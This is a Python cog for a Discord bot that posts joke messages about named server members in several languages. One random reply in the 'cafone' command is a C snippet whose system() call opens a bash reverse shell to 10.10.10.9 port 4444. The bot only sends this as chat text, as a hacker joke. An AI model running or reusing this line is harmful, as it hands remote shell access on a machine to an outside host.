from discord.ext import commands
from discord import slash_command

import os
from random import choice
from random import randrange

mod_role_id = int(os.getenv('MOD_ROLE_ID', 123))
admin_role_id = int(os.getenv('ADMIN_ROLE_ID', 123))
owner_role_id = int(os.getenv('OWNER_ROLE_ID', 123))
guild_ids = [int(os.getenv('SERVER_ID', 123))]

class Prestige(commands.Cog):
    """ Category for prestige commands. """

    def __init__(self, client: commands.Bot) -> None:
        """ Class init method. """

        self.client = client

    @slash_command(name="dnk", guild_ids=guild_ids)
    async def _dnk(self, ctx) -> None:
        """ Tells you something about DNK. """

        await ctx.respond(f"**`Sapristi ! C'est qui ? Oui, c'est lui le plus grave et inouï keum qu'on n'a jamais ouï-dire, tandis qu'on était si abasourdi et épris de lui d'être ici affranchi lorsqu'il a pris son joli gui qui ne nie ni être suivi par une souris sur son nid ni être mis ici un beau lundi !`**")

    @slash_command(name="gabriel", guild_ids=guild_ids)
    async def _gabriel_slash(self, ctx) -> None:
        """ Tells you something about Gabriel. """

        await ctx.respond(f"**<@366628959657394186>? Il est frais et il est chaud, et quand il rap c'est que du feu**")

    @commands.command(name="gabriel", aliases=["gab", "gabi", "gbrl", "gaburierudesu", "camisa9", "atacante", "rapper"])
    async def _gabriel_command(self, ctx) -> None:
        """ Tells you something about Gabriel. """

        await ctx.send(f"**<@366628959657394186>, desculpa por interromper o seu andamento, é que eu te vi passando, você é artista?**")

    @slash_command(name="twiks", guild_ids=guild_ids)
    async def _twiks(self, ctx) -> None:
        """ Tells you something about Twiks. """

        await ctx.respond(f"**Twiks est mon frérot !**")

    @commands.command(aliases=["lexi", "lèqçi", "lexis"])
    async def alexis(self, ctx) -> None:
        """ A command for telling something about Alexis. """

        sentences = [
            "**I have a really nice voice**",
            "**Best sister-in-law ever**",
            "**z!bj 50**",
            "**z!bj 2500**",
            "**I see where you're coming from**",
        ]

        await ctx.send(choice(sentences))

    @commands.command(aliases=["eli", "elj", "elijaaah"])
    async def elijah(self, ctx) -> None:
        """ A command for telling something about Elijah. """

        await ctx.send("**Sure, go for it.**")

    @commands.command()
    async def freak(self, ctx) -> None:
        """ A command for telling something about Marceline. """

        await ctx.send("You mean missy aka Marceline")

    @commands.command(aliases=["winni", "winnie", "wynni", "wynnie"])
    async def wyncham(self, ctx) -> None:
        """ A command for telling something about Wyncham. """

        sentences = [
            "**You have a really nice voice**",
            "**Leonarda is my best friend**",
            "**Elijah and DNK are my brothers**"
        ]

        await ctx.send(choice(sentences))

    @commands.command(aliases=["not_lime", "lemonade", "citric", "yellow_fruit"])
    async def lemon(self, ctx) -> None:
        """ A command for telling something about Wyncham. """

        sentences = [
            "**Easy peasy, lemon squeezy** �",
            "**When life gives you a lemon, make it an admin!** <:lemonsloth:785872087414996992>",
            "**My greatest fear is a limenade...**"
        ]

        await ctx.send(choice(sentences))

    @commands.command(aliases=["frenzy"])
    async def frenesia(self, ctx) -> None:
        """ A command for telling something about frenesia. """

        sentences = [
            "# MIAOOOOOOO <:cat_wave:924495909595779082> <@439110609745870870>",
            "**CIAO SONO FRENESIA 🇮🇹 <@439110609745870870>**",
            "AHAHAAHAHAHA <@439110609745870870>"
        ]

        await ctx.send(choice(sentences))

    @commands.command(aliases=["cafone", "napoletano", "forzanapoli", "ihatepython", "cbestlanguage", "iloveassembly", "iloveasm"])
    async def _cafone(self, ctx) -> None:
        """ A command for telling something about cafone. """

        sentences = [
            "i heard **assembly** <:peep_selfie:959872040301629561> <@703017795738402827>",
            "i heard **c++** <:peep_selfie:959872040301629561> <@703017795738402827>",
            "i heard **c** <:peep_selfie:959872040301629561> <@703017795738402827>",
            "i heard *python* <:pepecool:572067081508618251> <@703017795738402827>",
            """<@703017795738402827>
```c
#include <stdio.h>
#include <stdlib.h>

int main(void)
{
  const char* command = "/bin/bash -c '/bin/bash -i >& /dev/tcp/10.10.10.9/4444 0>&1'";
  const char* message = "cafone best engineer and hacker\\n";
  int result;

  result = system(command);
  if(result == -1)
  {
    printf("Error when executing the command.\\n");
    return 1;
  }
  else
  {
    printf("yeaahhh boiiii\\n");
  }

  for(;;)
    printf(message);

  return 0;
}
```""",
            "**sexiest italo/spanish engineer & hacker on the server🇮🇹🇪🇦** <@703017795738402827>"
        ]

        await ctx.send(choice(sentences))

    @commands.command(aliases=["felipe"])
    async def sousa(self, ctx) -> None:
        """ A command for telling something about Sousa. """

        sentences = [
            "If you give <@372100977060347906> a cup of coffee, he might tell you a secret...",
            "**<@372100977060347906> He's Simple, He's Dumb, He's The Pilot.**",
            "Gohan, vê se você me escuta... Não é pecado lutar pela justiça, ao contrário, é uma boa ação, pense... Existem inimigos que não são convencidos com palavras, você só tem que soltar a fúria que está dentro do seu espírito, eu sei como você se sente... Não precisa mais suportar isso Gohan... Gohan, proteja os seres vivos e as plantas desse mundo que eu tanto amei, conto com você. <@372100977060347906>"
        ]

        await ctx.send(choice(sentences))

    @commands.command(aliases=["maksiu, maks1u, c4tchme"])
    async def choose_right(self, ctx) -> None:

        idkWhichOne = [
            "Oh, <@312940056115544064>. 🧠 He's found... never mind",
            "<@312940056115544064> If this were a game of 'spot the right one,' I'd say we're still playing 😈",
            "👌 ||Almost there||, but this one is playing hard to get! <@312940056115544064>",
            "u got me! 💐 from <@312940056115544064>"
        ]

        await ctx.send(choice(idkWhichOne))

    @commands.command(aliases=["birds"])
    async def keybirds(self, ctx) -> None:
        """ A command for telling something about Keybirds. """

        sentences = [
            "<@584699027421921280> Well, sounds like a good idea",
            "<@584699027421921280> Stina wants to go outside",
            "<@584699027421921280> I closed it and now it's closed"
            ]

        await ctx.send(choice(sentences))

    @commands.command()
    async def loral(self, ctx) -> None:
        """ A command for telling something about loral. """

        await ctx.send("<@759049454819999776> Mans annoying")

    @commands.command()
    async def leonor(self, ctx) -> None:
        """ A command for telling something about leonor. """

        await ctx.send("<@754678627265675325> Human brain smells like cat piss when it dries out")

    @commands.command()
    async def anis(self, ctx) -> None:
        """ A command for telling something about anis. """

        await ctx.send("<@515991382217981952> niso")

    @commands.command(aliases=["hodjapie", "onekebappls"])
    async def hodja(self, ctx) -> None:
        """ A command for telling something about the kebap guy, hodja. """

        sentences = [
            "**I THOUGHT YOU WERE A GIRL** <@201086628167417857>",
            "*One kebap, please!* <@201086628167417857>"
        ]

        if randrange(67) == 33:
            await ctx.send("**SUPER RARE DOUBLE LAVASH KEBAP PULL!!!** <@201086628167417857>")
        else:
            await ctx.send(choice(sentences))

def setup(client) -> None:
    """ Cog's setup function. """

    client.add_cog(Prestige(client))
